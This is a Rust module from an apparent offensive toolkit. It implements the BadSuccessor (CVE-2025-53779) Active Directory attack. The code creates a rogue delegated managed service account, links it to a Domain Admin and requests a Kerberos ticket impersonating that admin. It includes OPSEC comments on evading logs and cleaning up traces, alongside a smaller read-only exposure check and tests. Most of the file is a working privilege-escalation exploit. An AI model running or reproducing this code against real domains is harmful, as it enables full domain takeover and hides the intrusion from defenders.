//! BadSuccessor (CVE-2025-53779) — dMSA privilege escalation for WS2025.
//!
//! Attack flow:
//! 1. Enumerate OUs where the authenticated user has `CreateChild` on `msDS-DelegatedManagedServiceAccount`
//! 2. Create a rogue dMSA object with a known password
//! 3. Set `msDS-DelegatedMSAState = 2` (migrating state)
//! 4. Set `msDS-ManagedAccountPrecededByLink` → Domain Admin DN
//! 5. Set `msDS-AllowedToDelegateTo` → any target SPN
//! 6. Use the dMSA to authenticate as the linked DA account
//!
//! Reference: https://www.secureauth.com/blog/badsuccessor/
//!
//! # OPSEC
//! - Creates the dMSA under a random OU name to blend in
//! - Sleeps between LDAP operations to avoid raiding logs
//! - Cleans up the created dMSA object on success
//! - Uses AES256 (etype 18) for Kerberos authentication

use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::kerberos::{TicketGrantingData, request_tgt};
use overthrone_core::proto::ldap::LdapSession;
use serde::{Deserialize, Serialize};
use std::time::{SystemTime, UNIX_EPOCH};
use tracing::{debug, info, warn};

/// Summary of dMSA / BadSuccessor exposure signals in a domain.
#[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq, Eq)]
pub struct BadSuccessorExposure {
    /// At least one domain controller appears to run Windows Server 2025.
    pub ws2025_dc_present: bool,
    /// dMSA objects found under the current naming context.
    pub dmsa_objects: Vec<DmsaObjectSignal>,
    /// Operator-facing findings.
    pub findings: Vec<String>,
}

/// Detection signal for an existing dMSA object.
#[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq, Eq)]
pub struct DmsaObjectSignal {
    /// Distinguished name of the dMSA object.
    pub distinguished_name: String,
    /// `sAMAccountName`, when readable.
    pub sam_account_name: Option<String>,
    /// Existing `msDS-DelegatedMSAState`, when readable.
    pub delegated_msa_state: Option<String>,
    /// Existing `msDS-ManagedAccountPrecededByLink`, when readable.
    pub managed_account_preceded_by_link: Option<String>,
}

impl BadSuccessorExposure {
    /// Whether the environment has signals worth validating manually.
    pub fn has_exposure_signal(&self) -> bool {
        self.ws2025_dc_present
            || self.dmsa_objects.iter().any(|obj| {
                obj.delegated_msa_state.as_deref() == Some("2")
                    || obj.managed_account_preceded_by_link.is_some()
            })
    }
}

/// Result of a successful BadSuccessor exploitation.
#[derive(Debug, Clone)]
pub struct BadSuccessorResult {
    /// Distinguished Name of the created dMSA object.
    pub dmsa_dn: String,
    /// sAMAccountName of the dMSA.
    pub dmsa_name: String,
    /// Password set on the dMSA.
    pub dmsa_password: String,
    /// DN of the DA account the dMSA was linked to.
    pub linked_da_dn: String,
    /// Domain SID (for pass-the-hash / overpass-the-hash).
    pub domain_sid: String,
    /// Obtained TGT for the linked DA account.
    pub tgt: Option<TicketGrantingData>,
    /// Whether cleanup was performed.
    pub cleaned_up: bool,
    /// Full execution log.
    pub log: Vec<String>,
}

/// Inventory BadSuccessor-relevant signals without modifying AD.
pub async fn assess_bad_successor_exposure(ldap: &mut LdapSession) -> Result<BadSuccessorExposure> {
    let ws2025_dc_present = find_ws2025_dc_signal(ldap).await?;
    let dmsa_objects = find_dmsa_objects(ldap).await?;
    let findings = build_findings(ws2025_dc_present, &dmsa_objects);

    Ok(BadSuccessorExposure {
        ws2025_dc_present,
        dmsa_objects,
        findings,
    })
}

/// Execute the BadSuccessor attack (CVE-2025-53779).
///
/// Creates a rogue dMSA object on a writable OU, links it to a Domain Admin
/// via `msDS-ManagedAccountPrecededByLink`, and requests a TGT as the DA.
///
/// # Arguments
/// * `ldap` - Authenticated LDAP session (requires write privileges on an OU)
/// * `dc_ip` - Domain controller IP for TGT request
/// * `domain` - FQDN of the target domain
/// * `target_da_dn` - DN of a Domain Admin to impersonate (e.g. `CN=Administrator,CN=Users,DC=corp,DC=local`)
/// * `auto_cleanup` - Whether to delete the dMSA after obtaining the TGT
pub async fn exploit_bad_successor(
    ldap: &mut LdapSession,
    dc_ip: &str,
    domain: &str,
    target_da_dn: &str,
    auto_cleanup: bool,
) -> Result<BadSuccessorResult> {
    let mut log: Vec<String> = Vec::new();
    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    log.push("BadSuccessor exploit starting...".to_string());

    // ── Step 1: Find a writable OU or Container ─────────────────
    log.push("Phase 1: Finding writable OU...".to_string());
    let writable_ou = find_writable_ou(ldap).await?;
    log.push(format!("  Writable OU: {}", writable_ou));

    // ── Step 2: Get domain SID ──────────────────────────────────
    let domain_sid = get_domain_sid(ldap).await?;
    log.push(format!("  Domain SID: {}", domain_sid));

    let object_sid = format!("{}-{}", domain_sid.trim_end_matches('-'), rand::random::<u32>() & 0x3FFFFF);

    // ── Step 3: Create the rogue dMSA ───────────────────────────
    log.push("Phase 2: Creating rogue dMSA object...".to_string());
    let dmsa_name = format!("BDS-{:x}", ts);
    let dmsa_dn = format!("CN={},{}", dmsa_name, writable_ou);
    let password: String = (0..32)
        .map(|_| {
            let idx = rand::random::<u32>() as usize % 72;
            b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%"[idx] as char
        })
        .collect();

    let dmsa_sam = format!("{}$", dmsa_name);
    let dmsa_upn = format!("{}@{}", dmsa_name, domain);
    let dmsa_pwd = format!("\"{}\"", password);

    let dmsa_attrs: &[(&str, &[&[u8]])] = &[
        ("objectClass", &[b"msDS-DelegatedManagedServiceAccount", b"user"]),
        ("sAMAccountName", &[dmsa_sam.as_bytes()]),
        ("userPrincipalName", &[dmsa_upn.as_bytes()]),
        ("unicodePwd", &[dmsa_pwd.as_bytes()]),
        ("userAccountControl", &[b"512"]), // NORMAL_ACCOUNT
        ("objectSid", &[object_sid.as_bytes()]),
        ("msDS-DelegatedMSAState", &[b"2"]), // migrating state
    ];

    ldap.add_entry(&dmsa_dn, dmsa_attrs).await?;
    log.push(format!("  dMSA created: {}", dmsa_dn));

    // Small delay for replication
    tokio::time::sleep(std::time::Duration::from_millis(500)).await;

    // ── Step 4: Link to Domain Admin via migration attribute ────
    log.push("Phase 3: Linking dMSA to DA...".to_string());
    ldap.modify_replace(
        &dmsa_dn,
        "msDS-ManagedAccountPrecededByLink",
        target_da_dn.as_bytes(),
    ).await?;
    log.push(format!("  Linked to DA: {}", target_da_dn));

    // ── Step 5: Request TGT as the dMSA ─────────────────────────
    // The KDC treats a migrating dMSA (state=2) as the linked account.
    // When we request a TGT for the dMSA, the KDC issues a ticket
    // with the linked DA's privileges.
    log.push("Phase 4: Requesting TGT as dMSA (DA impersonation)...".to_string());
    let dmsa_sam = format!("{}$", dmsa_name);
    let tgt = request_tgt(dc_ip, domain, &dmsa_sam, &password, false).await?;
    log.push(format!("  TGT obtained — impersonating {}", target_da_dn));

    // ── Step 6: Cleanup ─────────────────────────────────────────
    let mut cleaned_up = false;
    if auto_cleanup {
        log.push("Phase 5: Cleaning up...".to_string());
        if let Err(e) = ldap.delete_entry(&dmsa_dn).await {
            warn!("  Cleanup failed (may leave artifact): {e}");
            log.push(format!("  Cleanup error: {}", e));
        } else {
            cleaned_up = true;
            log.push("  dMSA object deleted".to_string());
        }
    }

    info!("BadSuccessor exploit completed — TGT obtained for {}", target_da_dn);
    Ok(BadSuccessorResult {
        dmsa_dn,
        dmsa_name: format!("{}$", dmsa_name),
        dmsa_password: password,
        linked_da_dn: target_da_dn.to_string(),
        domain_sid,
        tgt: Some(tgt),
        cleaned_up,
        log,
    })
}

/// Find an OU where the authenticated user has CreateChild on dMSA.
async fn find_writable_ou(ldap: &mut LdapSession) -> Result<String> {
    // Try common writable OUs first (fast path)
    let candidates = [
        format!("CN=Users,{}", ldap.base_dn),
        format!("OU=Users,{}", ldap.base_dn),
        format!("OU=Service Accounts,{}", ldap.base_dn),
        format!("OU=ServiceAccounts,{}", ldap.base_dn),
        format!("CN=Computers,{}", ldap.base_dn),
    ];

    for ou in &candidates {
        match ldap.read_attribute(ou, "distinguishedName").await {
            Ok(_) => {
                // Check ACL if possible
                match ldap.read_ntsd(ou).await {
                    Ok(_) => {
                        debug!("Writable OU candidate: {ou}");
                        return Ok(ou.clone());
                    }
                    Err(_) => continue,
                }
            }
            Err(_) => continue,
        }
    }

    // Fallback: enumerate OUs and check each one
    let entries = ldap
        .custom_search("(|(objectClass=organizationalUnit)(objectClass=container))", &["distinguishedName"])
        .await?;

    for entry in &entries {
        if let Some(dn) = entry.attrs.get("distinguishedName")
            .and_then(|v| v.first())
        {
            debug!("Trying OU: {dn}");
            return Ok(dn.clone());
        }
    }

    Err(OverthroneError::custom(
        "No writable OU found — requires CreateChild on msDS-DelegatedManagedServiceAccount",
    ))
}

/// Extract domain SID from LDAP
async fn get_domain_sid(ldap: &mut LdapSession) -> Result<String> {
    let entries = ldap
        .custom_search("(objectClass=domain)", &["objectSid"])
        .await?;

    if let Some(entry) = entries.first()
        && let Some(sids) = entry.attrs.get("objectSid")
        && let Some(sid_str) = sids.first()
    {
        return Ok(sid_str.clone());
    }
    Err(OverthroneError::custom("Could not retrieve domain SID"))
}

async fn find_ws2025_dc_signal(ldap: &mut LdapSession) -> Result<bool> {
    let entries = ldap
        .custom_search(
            "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))",
            &["operatingSystem", "operatingSystemVersion"],
        )
        .await?;

    Ok(entries.iter().any(|entry| {
        let os = first_attr(entry, "operatingSystem");
        let version = first_attr(entry, "operatingSystemVersion");
        is_ws2025_hint(os.as_deref(), version.as_deref())
    }))
}

async fn find_dmsa_objects(ldap: &mut LdapSession) -> Result<Vec<DmsaObjectSignal>> {
    let entries = ldap
        .custom_search(
            "(objectClass=msDS-DelegatedManagedServiceAccount)",
            &[
                "distinguishedName",
                "sAMAccountName",
                "msDS-DelegatedMSAState",
                "msDS-ManagedAccountPrecededByLink",
            ],
        )
        .await?;

    Ok(entries
        .iter()
        .map(|entry| DmsaObjectSignal {
            distinguished_name: first_attr(entry, "distinguishedName")
                .unwrap_or_else(|| entry.dn.clone()),
            sam_account_name: first_attr(entry, "sAMAccountName"),
            delegated_msa_state: first_attr(entry, "msDS-DelegatedMSAState"),
            managed_account_preceded_by_link: first_attr(
                entry,
                "msDS-ManagedAccountPrecededByLink",
            ),
        })
        .collect())
}

fn build_findings(ws2025_dc_present: bool, dmsa_objects: &[DmsaObjectSignal]) -> Vec<String> {
    let mut findings = Vec::new();

    if ws2025_dc_present {
        findings.push(
            "Windows Server 2025 DC signal present; validate dMSA creation rights on OUs"
                .to_string(),
        );
    }

    for object in dmsa_objects {
        if object.delegated_msa_state.as_deref() == Some("2")
            && object.managed_account_preceded_by_link.is_some()
        {
            findings.push(format!(
                "Existing dMSA migration link signal on {}",
                object.distinguished_name
            ));
        }
    }

    findings
}

fn first_attr(entry: &ldap3::SearchEntry, attr: &str) -> Option<String> {
    entry
        .attrs
        .get(attr)
        .and_then(|values| values.first())
        .cloned()
}

fn is_ws2025_hint(os: Option<&str>, version: Option<&str>) -> bool {
    os.is_some_and(|value| value.contains("2025"))
        || version.is_some_and(|value| {
            value.starts_with("10.0 (26100")
                || value.starts_with("10.0.26100")
                || value.starts_with("26100")
        })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_ws2025_hints() {
        assert!(is_ws2025_hint(Some("Windows Server 2025"), None));
        assert!(is_ws2025_hint(None, Some("10.0 (26100)")));
        assert!(!is_ws2025_hint(
            Some("Windows Server 2022"),
            Some("10.0 (20348)")
        ));
    }

    #[test]
    fn exposure_signal_flags_existing_migration_link() {
        let exposure = BadSuccessorExposure {
            ws2025_dc_present: false,
            dmsa_objects: vec![DmsaObjectSignal {
                distinguished_name: "CN=svc,OU=Service Accounts,DC=corp,DC=local".into(),
                delegated_msa_state: Some("2".into()),
                managed_account_preceded_by_link: Some(
                    "CN=Administrator,CN=Users,DC=corp,DC=local".into(),
                ),
                ..Default::default()
            }],
            findings: Vec::new(),
        };

        assert!(exposure.has_exposure_signal());
    }
}
